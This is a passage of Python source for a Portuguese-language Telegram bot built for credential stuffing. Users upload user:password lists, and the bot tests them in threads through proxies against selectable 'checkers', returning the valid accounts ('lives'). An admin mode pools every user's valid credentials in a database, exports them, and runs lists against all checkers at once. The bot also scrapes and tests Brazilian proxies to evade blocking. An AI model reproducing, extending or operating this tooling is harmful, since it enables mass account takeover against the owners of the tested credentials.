    u   = message.from_user
    uid = u.id
    ensure_user(uid, u.username, u.full_name)

    if not is_auth(uid):
        await bot.reply_to(
            message,
            f"⛔ *Acesso negado.*\nSolicite acesso ao admin.\n\n`Seu ID: {uid}`",
            parse_mode="Markdown",
        )
        return

    chks = get_user_checkers(uid)
    if not chks:
        await bot.reply_to(message, "⚠️ Nenhum checker liberado. Aguarde o admin.")
        return

    _ud_clear(uid)
    px_count = len(get_user_proxies(uid))
    px_text  = f"✅ {px_count} proxies" if px_count else "❌ sem proxies · /myproxy"
    await bot.reply_to(
        message,
        f"🔍 *Escolha o checker:*\n\n🌐 {px_text}",
        parse_mode="Markdown",
        reply_markup=_kb_checkers(uid),
    )

@bot.message_handler(commands=["admin"])
async def cmd_admin(message):
    uid = message.from_user.id
    if not is_admin(uid):
        return
    total  = len(list_users())
    authed = sum(1 for u in list_users() if u[3])
    await bot.reply_to(
        message,
        f"⚡ *Painel Admin*\n`Total: {total}  |  Auth: {authed}`",
        parse_mode="Markdown",
        reply_markup=_kb_admin(),
    )

@bot.message_handler(commands=["myproxy"])
async def cmd_myproxy(message):
    uid = message.from_user.id
    if not is_auth(uid):
        return
    px_count = len(get_user_proxies(uid))
    _ud(uid)["waiting_proxy"] = True
    status = f"✅ {px_count} proxies ativos" if px_count else "❌ Sem proxies"
    kb = None
    if px_count:
        kb = types.InlineKeyboardMarkup([[
            types.InlineKeyboardButton("🗑️ Limpar proxies", callback_data="px:clear")
        ]])
    await bot.reply_to(
        message,
        f"🌐 *Gerenciar Proxies*\n{status}\n\nEnvie um arquivo *.txt* com proxies (`ip:porta` por linha).",
        parse_mode="Markdown",
        reply_markup=kb,
    )

@bot.message_handler(commands=["perfil"])
async def cmd_perfil(message):
    u   = message.from_user
    uid = u.id
    ensure_user(uid, u.username, u.full_name)
    px_count = len(get_user_proxies(uid))

    if is_admin(uid):
        users  = list_users()
        authed = sum(1 for x in users if x[3])
        await bot.reply_to(
            message,
            f"👑 *Perfil Admin*\n"
            f"```\n"
            f"Nome     : {u.full_name or u.username or uid}\n"
            f"ID       : {uid}\n"
            f"Threads  : ilimitado\n"
            f"Proxies  : {px_count}\n"
            f"Usuários : {len(users)}\n"
            f"Auth     : {authed}\n"
            f"```",
            parse_mode="Markdown",
        )
        return

    row = _db("SELECT username, full_name, is_auth, added_at, threads FROM users WHERE user_id=?", uid, fetch="one")
    if not row:
        await bot.reply_to(message, "❌ Usuário não encontrado.")
        return
    uname, fname, is_a, added_at, threads = row
    chks     = get_user_checkers(uid)
    chk_list = ", ".join(CHECKERS[k] for k in chks) if chks else "nenhum"
    if is_a:
        status_txt = "✅ Autorizado"
    elif is_public_mode():
        status_txt = "🌍 Público"
    else:
        status_txt = "❌ Bloqueado"
    await bot.reply_to(
        message,
        f"👤 *Meu Perfil*\n"
        f"```\n"
        f"Nome     : {fname or uname or uid}\n"
        f"ID       : {uid}\n"
        f"Status   : {status_txt}\n"
        f"Threads  : {get_user_threads(uid)}\n"
        f"Proxies  : {px_count}\n"
        f"Checkers : {chk_list}\n"
        f"Desde    : {(added_at or '')[:10] or 'N/A'}\n"
        f"```",
        parse_mode="Markdown",
    )

@bot.message_handler(commands=["cancel"])
async def cmd_cancel(message):
    uid = message.from_user.id
    tmp = _ud(uid).pop("tmp_file", None)
    if tmp:
        Path(tmp).unlink(missing_ok=True)
    _ud_clear(uid)
    await bot.reply_to(message, "❌ Cancelado.")

# ── Document handler ────────────────────────────────────────────────────────────
@bot.message_handler(content_types=["document"])
async def on_document(message):
    u   = message.from_user
    uid = u.id
    ensure_user(uid, u.username, u.full_name)
    data = _ud(uid)
    doc  = message.document

    # 1) admin testing a credential list against every checker (CX2)
    if data.pop("waiting_cx2_test", False):
        if not is_admin(uid):
            return
        raw = await _download_document(doc)
        tmp = TMP_DIR / f"cx2test_{uid}_{int(time.time())}.txt"
        tmp.write_bytes(raw)
        data["cx2_test_file"] = str(tmp)
        await bot.reply_to(
            message,
            "🔤 Qual o *delimitador*?",
            parse_mode="Markdown",
            reply_markup=types.InlineKeyboardMarkup([[
                types.InlineKeyboardButton("  :  ", callback_data="cx2dl::"),
                types.InlineKeyboardButton("  ;  ", callback_data="cx2dl:;"),
                types.InlineKeyboardButton("  |  ", callback_data="cx2dl:|"),
            ]]),
        )
        return

    # 2) user uploading their own proxy list
    if data.pop("waiting_proxy", False):
        if not is_auth(uid):
            return
        raw  = await _download_document(doc)
        text = raw.decode("utf-8", errors="ignore")

        lines = [l.strip() for l in text.splitlines() if l.strip()]
        if not lines:
            await bot.reply_to(message, "⚠️ Arquivo vazio ou sem proxies válidos.")
            return

        data["pending_proxies"] = text
        await bot.reply_to(
            message,
            f"📋 *{len(lines)} proxies encontrados.*\nO que deseja fazer?",
            parse_mode="Markdown",
            reply_markup=types.InlineKeyboardMarkup([[
                types.InlineKeyboardButton("🔍 Testar conectividade", callback_data="px:test"),
                types.InlineKeyboardButton("✅ Salvar direto",        callback_data="px:save"),
            ]]),
        )
        return

    # 3) regular checker flow (credential list)
    if not is_auth(uid):
        await bot.reply_to(message, f"⛔ Sem acesso. `ID: {uid}`", parse_mode="Markdown")
        return

    if not doc.file_name.lower().endswith(".txt"):
        await bot.reply_to(message, "⚠️ Envie um arquivo *.txt*", parse_mode="Markdown")
        return

    raw = await _download_document(doc)
    tmp = TMP_DIR / f"in_{uid}_{int(time.time())}.txt"
    tmp.write_bytes(raw)
    data["tmp_file"] = str(tmp)

    # new flow: checker already chosen → ask delimiter
    if data.get("checker"):
        ck = data["checker"]
        await bot.reply_to(
            message,
            f"✅ *{CHECKERS[ck]}*\n\n🔤 Qual o *delimitador*?",
            parse_mode="Markdown",
            reply_markup=_kb_delim(),
        )
        return

    # legacy flow: file sent first → show checkers
    chks = get_user_checkers(uid)
    if not chks:
        await bot.reply_to(message, "⚠️ Nenhum checker liberado. Aguarde o admin.")
        return

    await bot.reply_to(
        message,
        "🔍 *Escolha o checker:*",
        parse_mode="Markdown",
        reply_markup=_kb_checkers(uid),
    )

# ── Callback query dispatcher ───────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda call: True)
async def on_callback(call):
    d = call.data or ""
    if d.startswith("chk:"):
        await on_checker_chosen(call)
    elif d.startswith("dl:"):
        await on_delim_chosen(call)
    elif d.startswith("px:"):
        await on_proxy_cb(call)
    elif d.startswith("cx2dl:"):
        await on_cx2_delim_cb(call)
    elif d.startswith("pub:"):
        await on_public_cb(call)
    elif d.startswith(("adm:", "usr:", "auth:", "perm:", "thd:", "delpx:")):
        await on_admin_cb(call)
    else:
        await bot.answer_callback_query(call.id)

async def on_checker_chosen(call):
    uid = call.from_user.id
    val = call.data.split(":", 1)[1]
    chat_id, message_id = call.message.chat.id, call.message.message_id
    data = _ud(uid)

    if val == "cancel":
        await bot.answer_callback_query(call.id)
        tmp = data.pop("tmp_file", None)
        if tmp:
            Path(tmp).unlink(missing_ok=True)
        _ud_clear(uid)
        await _edit(chat_id, message_id, "❌ Cancelado.")
        return

    if val not in get_user_checkers(uid):
        await bot.answer_callback_query(call.id, "⛔ Sem permissão para este checker.", show_alert=True)
        return

    await bot.answer_callback_query(call.id)
    data["checker"] = val

    if data.get("tmp_file"):
        await _edit(
            chat_id, message_id,
            f"✅ *{CHECKERS[val]}*\n\n🔤 Qual o *delimitador*?",
            parse_mode="Markdown",
            reply_markup=_kb_delim(),
        )
        return

    await _edit(
        chat_id, message_id,
        f"✅ *{CHECKERS[val]}*\n\n📂 Agora envie o arquivo *.txt* com as credenciais.",
        parse_mode="Markdown",
    )

async def on_delim_chosen(call):
    await bot.answer_callback_query(call.id)
    uid = call.from_user.id
    val = call.data.split(":", 1)[1]
    chat_id, message_id = call.message.chat.id, call.message.message_id
    data = _ud(uid)

    if val == "cancel":
        tmp = data.pop("tmp_file", None)
        if tmp:
            Path(tmp).unlink(missing_ok=True)
        _ud_clear(uid)
        await _edit(chat_id, message_id, "❌ Cancelado.")
        return

    checker  = data.pop("checker", None)
    tmp_file = data.pop("tmp_file", None)

    if not checker or not tmp_file:
        await _edit(chat_id, message_id, "❌ Erro interno. Tente novamente.")
        _ud_clear(uid)
        return

    await _edit(
        chat_id, message_id,
        f"⏳ *{CHECKERS[checker]}* iniciando com delimitador `{val}`...",
        parse_mode="Markdown",
    )

    asyncio.create_task(_run_checker(chat_id, uid, checker, tmp_file, val))

# ── Proxy action callback ───────────────────────────────────────────────────────
async def on_proxy_cb(call):
    await bot.answer_callback_query(call.id)
    uid = call.from_user.id
    if not is_auth(uid):
        return
    chat_id, message_id = call.message.chat.id, call.message.message_id
    data   = _ud(uid)
    action = call.data.split(":", 1)[1]

    if action == "clear":
        set_user_proxies(uid, "")
        await _edit(chat_id, message_id, "🗑️ Proxies removidos. Checagens vão direto, sem proxy.")

    elif action == "save":
        text = data.pop("pending_proxies", "")
        set_user_proxies(uid, text)
        count = len([l for l in text.splitlines() if l.strip()])
        await _edit(chat_id, message_id, f"✅ {count} proxies salvos!")

    elif action == "test":
        text    = data.pop("pending_proxies", "")
        proxies = [l.strip() for l in text.splitlines() if l.strip()]
        if not proxies:
            await _edit(chat_id, message_id, "⚠️ Nenhum proxy para testar.")
            return
        await _edit(chat_id, message_id, f"🔍 Testando {len(proxies)} proxies... aguarde ⏳")
        asyncio.create_task(_run_proxy_test(uid, proxies, chat_id))

# ── CX2 delimiter callback ─────────────────────────────────────────────────────
async def on_cx2_delim_cb(call):
    await bot.answer_callback_query(call.id)
    uid = call.from_user.id
    if not is_admin(uid):
        return
    chat_id, message_id = call.message.chat.id, call.message.message_id
    delim    = call.data.split(":", 1)[1]
    tmp_file = _ud(uid).pop("cx2_test_file", None)
    if not tmp_file:
        await _edit(chat_id, message_id, "❌ Arquivo não encontrado. Tente novamente.")
        return
    path = Path(tmp_file)
    try:
        lines = [l.strip() for l in path.read_text(encoding="utf-8", errors="ignore").splitlines()
                 if l.strip() and delim in l]
    finally:
        path.unlink(missing_ok=True)
    if not lines:
        await _edit(chat_id, message_id, "⚠️ Nenhuma credencial válida encontrada.")
        return
    await _edit(
        chat_id, message_id,
        f"🔀 *CX2 Multi* iniciando com delimitador `{delim}`...", parse_mode="Markdown"
    )
    asyncio.create_task(_run_cx2(chat_id, uid, lines, delim))

# ── Public mode callback handler ────────────────────────────────────────────────
async def on_public_cb(call):
    await bot.answer_callback_query(call.id)
    uid = call.from_user.id
    if not is_admin(uid):
        return
    chat_id, message_id = call.message.chat.id, call.message.message_id
    data = call.data

    if data == "pub:toggle":
        set_public_mode(not is_public_mode())
    elif data.startswith("pub:chk:"):
        checker = data.split(":", 2)[2]
        toggle_public_checker(checker)
    elif data.startswith("pub:thd:"):
        n = int(data.split(":")[2])
        set_public_threads(n)

    status = "🟢 Ativado" if is_public_mode() else "🔴 Desativado"
    await _edit(
        chat_id, message_id,
        f"🌍 *Modo Público*\n`Status: {status}`\n\n"
        f"Quando ativado, qualquer pessoa pode usar o bot sem o admin "
        f"precisar autorizar uma por uma. Escolha abaixo quais checkers "
        f"e quantas threads o público vai ter por padrão.\n\n"
        f"_Usuários já autorizados individualmente continuam com as "
        f"próprias permissões e threads, sem serem afetados._",
        parse_mode="Markdown",
        reply_markup=_kb_public(),
    )

# ── Admin callback handler ──────────────────────────────────────────────────────
async def on_admin_cb(call):
    await bot.answer_callback_query(call.id)
    uid = call.from_user.id
    if not is_admin(uid):
        return

    chat_id, message_id = call.message.chat.id, call.message.message_id
    data = call.data

    if data in ("adm:back", "adm:menu"):
        total  = len(list_users())
        authed = sum(1 for u in list_users() if u[3])
        await _edit(
            chat_id, message_id,
            f"⚡ *Painel Admin*\n`Total: {total}  |  Auth: {authed}`",
            parse_mode="Markdown",
            reply_markup=_kb_admin(),
        )

    elif data == "adm:users":
        users = list_users()
        if not users:
            await _edit(
                chat_id, message_id,
                "Nenhum usuário ainda.",
                reply_markup=types.InlineKeyboardMarkup([[types.InlineKeyboardButton("🔙", callback_data="adm:back")]]),
            )
            return
        await _edit(
            chat_id, message_id,
            "👥 *Usuários:*", parse_mode="Markdown", reply_markup=_kb_users(users)
        )

    elif data == "adm:proxygen":
        await _edit(chat_id, message_id, "🌐 Gerando proxies BR... aguarde ⏳")
        asyncio.create_task(_run_proxy_gen(chat_id))

    elif data == "adm:public":
        status = "🟢 Ativado" if is_public_mode() else "🔴 Desativado"
        await _edit(
            chat_id, message_id,
            f"🌍 *Modo Público*\n`Status: {status}`\n\n"
            f"Quando ativado, qualquer pessoa pode usar o bot sem o admin "
            f"precisar autorizar uma por uma. Escolha abaixo quais checkers "
            f"e quantas threads o público vai ter por padrão.\n\n"
            f"_Usuários já autorizados individualmente continuam com as "
            f"próprias permissões e threads, sem serem afetados._",
            parse_mode="Markdown",
            reply_markup=_kb_public(),
        )

    elif data == "adm:cx2":
        count = cx2_count()
        await _edit(
            chat_id, message_id,
            f"📦 *CX2 — Lives Acumulados*\n`Total: {count} lives de todos os usuários`",
            parse_mode="Markdown",
            reply_markup=_kb_cx2(count),
        )

    elif data == "adm:cx2export":
        rows = cx2_all()
        if not rows:
            await bot.answer_callback_query(call.id, "Nenhum live acumulado ainda.", show_alert=True)
            return
        lines = [f"[{r[0]}] [@{r[1]}] {r[2]}" for r in rows]
        out   = TMP_DIR / f"cx2_export_{int(time.time())}.txt"
        out.write_text("\n".join(lines), encoding="utf-8")
        with out.open("rb") as fh:
            await bot.send_document(
                chat_id, fh,
                visible_file_name="cx2_lives_todos.txt",
                caption=f"📦 {len(lines)} lives acumulados · CX2",
            )
        out.unlink(missing_ok=True)

    elif data == "adm:cx2test":
        _ud(uid)["waiting_cx2_test"] = True
        await _edit(
            chat_id, message_id,
            "📂 Envie o arquivo *.txt* com as credenciais para testar em todos os checkers.",
            parse_mode="Markdown",
        )

    elif data == "adm:cx2clear":
        cx2_clear()
        await bot.answer_callback_query(call.id, "CX2 limpo!", show_alert=True)
        await _edit(
            chat_id, message_id,
            "📦 *CX2 — Lives Acumulados*\n`Total: 0 lives de todos os usuários`",
            parse_mode="Markdown",
            reply_markup=_kb_cx2(0),
        )

    elif data == "adm:status":
        users  = list_users()
        authed = sum(1 for u in users if u[3])
        await _edit(
            chat_id, message_id,
            f"📊 *Status do Bot*\n```\nUsuários:    {len(users)}\nAutorizados: {authed}```",
            parse_mode="Markdown",
            reply_markup=types.InlineKeyboardMarkup([[types.InlineKeyboardButton("🔙 Voltar", callback_data="adm:back")]]),
        )

    elif data.startswith("usr:"):
        target = int(data.split(":")[1])
        row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
        if not row:
            await _edit(chat_id, message_id, "Usuário não encontrado.")
            return
        _, uname, fname, is_a = row
        name = fname or uname or str(target)
        threads = get_user_threads(target)
        await _edit(
            chat_id, message_id,
            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
            parse_mode="Markdown",
            reply_markup=_kb_manage(target, bool(is_a)),
        )

    elif data.startswith("auth:"):
        _, target, val = data.split(":")
        target = int(target)
        authorize_user(target, val == "1")
        row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
        _, uname, fname, is_a = row
        name = fname or uname or str(target)
        threads = get_user_threads(target)
        await _edit(
            chat_id, message_id,
            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
            parse_mode="Markdown",
            reply_markup=_kb_manage(target, bool(is_a)),
        )
        try:
            msg = (
                "✅ Seu acesso foi *liberado*! Envie /start para começar."
                if val == "1"
                else "⛔ Seu acesso foi *revogado*."
            )
            await bot.send_message(target, msg, parse_mode="Markdown")
        except Exception:
            pass

    elif data.startswith("perm:"):
        _, target, checker = data.split(":", 2)
        target = int(target)
        toggle_checker(target, checker)
        row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
        _, uname, fname, is_a = row
        name = fname or uname or str(target)
        threads = get_user_threads(target)
        await _edit(
            chat_id, message_id,
            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
            parse_mode="Markdown",
            reply_markup=_kb_manage(target, bool(is_a)),
        )

    elif data.startswith("thd:"):
        _, target, n = data.split(":")
        target = int(target)
        set_user_threads(target, int(n))
        row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
        _, uname, fname, is_a = row
        name = fname or uname or str(target)
        await _edit(
            chat_id, message_id,
            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {int(n)}T",
            parse_mode="Markdown",
            reply_markup=_kb_manage(target, bool(is_a)),
        )

    elif data.startswith("delpx:"):
        target = int(data.split(":")[1])
        set_user_proxies(target, "")
        row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
        _, uname, fname, is_a = row
        name = fname or uname or str(target)
        threads = get_user_threads(target)
        await bot.answer_callback_query(call.id, "Proxies do usuário removidos!", show_alert=True)
        await _edit(
            chat_id, message_id,
            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
            parse_mode="Markdown",
            reply_markup=_kb_manage(target, bool(is_a)),
        )

# ── Background: run checker ─────────────────────────────────────────────────────
async def _run_checker(chat_id, uid, checker, tmp_file, delim):
    try:
        path = Path(tmp_file)
        try:
            lines = [
                l.strip()
                for l in path.read_text(encoding="utf-8", errors="ignore").splitlines()
                if l.strip() and delim in l
            ]
        finally:
            path.unlink(missing_ok=True)

        if not lines:
            await bot.send_message(chat_id, "⚠️ Nenhuma credencial válida encontrada.")
            return

        total     = len(lines)
        fn        = CHECKER_FN[checker]
        name      = CHECKERS[checker]
        lives: list[str] = []
        erros: list[str] = []
        checked   = 0
        last_edit = time.time()

        prog = await bot.send_message(
            chat_id, f"🔄 *{name}* · `0/{total}`", parse_mode="Markdown"
        )

        px_count = len(get_user_proxies(uid))
        threads  = get_user_threads(uid)
        urow     = _db("SELECT username FROM users WHERE user_id=?", uid, fetch="one")
        uname    = (urow[0] if urow and urow[0] else None) or str(uid)

        def px_fn():
            return _proxy_for(uid)

        async def _process(line):
            nonlocal checked
            parts = line.split(delim, 1)
            if len(parts) < 2:
                return
            user, pwd = parts[0].strip(), parts[1].strip()
            if not user or not pwd:
                return
            result, extra = await asyncio.to_thread(fn, user, pwd, px_fn)
            checked += 1
            entry = f"{user}:{pwd}" + (f" | {extra}" if extra else "")
            if result == "live":
                lives.append(entry)
                cx2_save(uid, uname, name, entry)
            elif result == "erro" and len(erros) < 5:
                erros.append(extra)

        async def _edit_progress():
            nonlocal last_edit
            now = time.time()
            if now - last_edit >= 3:
                await _edit(
                    prog.chat.id, prog.message_id,
                    f"🔄 *{name}* · `{checked}/{total}` · ✅ `{len(lives)}`",
                    parse_mode="Markdown",
                )
                last_edit = now

        if threads > 1:
            sem = asyncio.Semaphore(threads)

            async def _sem_task(line):
                async with sem:
                    await _process(line)

            tasks = [asyncio.create_task(_sem_task(l)) for l in lines]
            for t in asyncio.as_completed(tasks):
                await t
                await _edit_progress()
        else:
            for line in lines:
                await _process(line)
                await _edit_progress()

        dies = total - len(lives)
        summary = (
            f"✅ *{name}* concluído!\n"
            f"```\n"
            f"Total   : {total}\n"
            f"Lives   : {len(lives)}\n"
            f"Dies    : {dies}\n"
            f"Threads : {threads}\n"
            f"Proxy   : {'ativo (' + str(px_count) + ')' if px_count else 'desativado'}\n"
            f"```"
        )
        await _edit(prog.chat.id, prog.message_id, summary, parse_mode="Markdown")

        if erros:
            erro_txt = "\n".join(f"• `{e}`" for e in erros)
            await bot.send_message(
                chat_id,
                f"⚠️ *Amostra de erros:*\n{erro_txt}",
                parse_mode="Markdown",
            )

        if lives:
            out = TMP_DIR / f"live_{checker}_{uid}.txt"
            out.write_text("\n".join(lives), encoding="utf-8")
            with out.open("rb") as fh:
                await bot.send_document(
                    chat_id, fh,
                    visible_file_name=f"live_{checker}.txt",
                    caption=f"✅ {len(lives)} lives · {name}",
                )
            out.unlink(missing_ok=True)
        else:
            await bot.send_message(chat_id, "☠️ Nenhum live encontrado.")

    except Exception as e:
        await bot.send_message(chat_id, f"❌ Erro: `{e}`", parse_mode="Markdown")

# ── Background: CX2 multi-checker (admin only) ─────────────────────────────────
async def _run_cx2(chat_id, uid, lines, delim):
    try:
        total_creds = len(lines)
        total_chk   = len(CHECKERS)
        all_lives:  list[str] = []
        all_erros:  list[str] = []
        px_count    = len(get_user_proxies(uid))
        urow        = _db("SELECT username FROM users WHERE user_id=?", uid, fetch="one")
        uname       = (urow[0] if urow and urow[0] else None) or str(uid)

        prog = await bot.send_message(
            chat_id,
            f"🔀 *CX2 Multi* · {total_creds} creds × {total_chk} checkers",
            parse_mode="Markdown",
        )

        def px_fn():
            return _proxy_for(uid)

        for idx, (ck_key, ck_name) in enumerate(CHECKERS.items(), 1):
            await _edit(
                prog.chat.id, prog.message_id,
                f"🔀 *CX2* · {idx}/{total_chk}\n"
                f"`▶ {ck_name}` · lives: `{len(all_lives)}`",
                parse_mode="Markdown",
            )

            fn = CHECKER_FN[ck_key]

            for line in lines:
                parts = line.split(delim, 1)
                if len(parts) < 2:
                    continue
                user, pwd = parts[0].strip(), parts[1].strip()
                if not user or not pwd:
                    continue
                result, extra = await asyncio.to_thread(fn, user, pwd, px_fn)
                if result == "live":
                    entry = f"[{ck_name}] {user}:{pwd}" + (f" | {extra}" if extra else "")
                    all_lives.append(entry)
                    cx2_save(uid, uname, ck_name, entry)
                elif result == "erro" and len(all_erros) < 5:
                    all_erros.append(f"[{ck_name}] {extra}")

        summary = (
            f"✅ *CX2 Multi* concluído!\n"
            f"```\n"
            f"Checkers : {total_chk}\n"
            f"Creds    : {total_creds}\n"
            f"Lives    : {len(all_lives)}\n"
            f"Proxy    : {'ativo (' + str(px_count) + ')' if px_count else 'desativado'}\n"
            f"```"
        )
        await _edit(prog.chat.id, prog.message_id, summary, parse_mode="Markdown")

        if all_erros:
            await bot.send_message(
                chat_id,
                "⚠️ *Amostra de erros:*\n" + "\n".join(f"• `{e}`" for e in all_erros),
                parse_mode="Markdown",
            )

        if all_lives:
            out = TMP_DIR / f"cx2_{uid}_{int(time.time())}.txt"
            out.write_text("\n".join(all_lives), encoding="utf-8")
            with out.open("rb") as fh:
                await bot.send_document(
                    chat_id, fh,
                    visible_file_name="cx2_lives.txt",
                    caption=f"🔀 {len(all_lives)} lives · CX2 Multi",
                )
            out.unlink(missing_ok=True)
        else:
            await bot.send_message(chat_id, "☠️ Nenhum live encontrado.")

    except Exception as e:
        await bot.send_message(chat_id, f"❌ Erro CX2: `{e}`", parse_mode="Markdown")

# ── Background: proxy tester ────────────────────────────────────────────────────
async def _run_proxy_test(uid, proxies, chat_id):
    try:
        total = len(proxies)
        msg   = await bot.send_message(chat_id, f"🔍 Testando 0/{total}...")
        vivos: list[str] = []
        sem   = asyncio.Semaphore(20)
        state = {"checked": 0, "last_edit": time.time()}

        async def _chk(p):
            async with sem:
                ok = await asyncio.to_thread(_check_proxy_alive, p)
                if ok:
                    vivos.append(p)
                state["checked"] += 1
                now = time.time()
                if now - state["last_edit"] >= 3:
                    await _edit(
                        msg.chat.id, msg.message_id,
                        f"🔍 Testando {state['checked']}/{total}... ✅ {len(vivos)}",
                    )
                    state["last_edit"] = now

        await asyncio.gather(*[_chk(p) for p in proxies])
        set_user_proxies(uid, "\n".join(vivos))
        await _edit(
            msg.chat.id, msg.message_id,
            f"✅ *Teste concluído!*\n"
            f"```\n"
            f"Testados : {total}\n"
            f"Vivos    : {len(vivos)}\n"
            f"Mortos   : {total - len(vivos)}\n"
            f"```",
            parse_mode="Markdown",
        )
    except Exception as e:
        await bot.send_message(chat_id, f"❌ Erro no teste: `{e}`", parse_mode="Markdown")

# ── Background: proxy generator ─────────────────────────────────────────────────
async def _run_proxy_gen(chat_id):
    try:
        msg     = await bot.send_message(chat_id, "🌐 Buscando proxies BR...")
        proxies = await asyncio.to_thread(_fetch_proxies)
        total   = len(proxies)

        if not total:
            await _edit(msg.chat.id, msg.message_id, "☠️ Nenhum proxy encontrado nas fontes.")
            return

        await _edit(msg.chat.id, msg.message_id, f"🌐 {total} encontrados. Checando conectividade...")

        vivos: list[str] = []
        sem   = asyncio.Semaphore(80)

        async def _chk(p):
            async with sem:
                ok = await asyncio.to_thread(_check_proxy_alive, p)
                if ok:
                    vivos.append(p)

        await asyncio.gather(*[_chk(p) for p in proxies])

        if vivos:
            out = TMP_DIR / f"proxys_br_{int(time.time())}.txt"
            out.write_text("\n".join(vivos), encoding="utf-8")
            await _edit(msg.chat.id, msg.message_id, f"✅ {len(vivos)}/{total} proxies vivos!")
            with out.open("rb") as fh:
                await bot.send_document(
                    chat_id, fh,
                    visible_file_name="proxys_br.txt",
                    caption=f"🌐 {len(vivos)} proxies BR vivos",
                )
            out.unlink(missing_ok=True)
        else:
            await _edit(msg.chat.id, msg.message_id, "☠️ Nenhum proxy vivo encontrado.")

    except Exception as e:
        await bot.send_message(chat_id, f"❌ Erro proxy gen: `{e}`", parse_mode="Markdown")

# ── Main ────────────────────────────────────────────────────────────────────────
async def main():
    db_init()
    print("✅ Bot iniciado.")
    await bot.infinity_polling(skip_pending=True)

if __name__ == "__main__":
    asyncio.run(main())
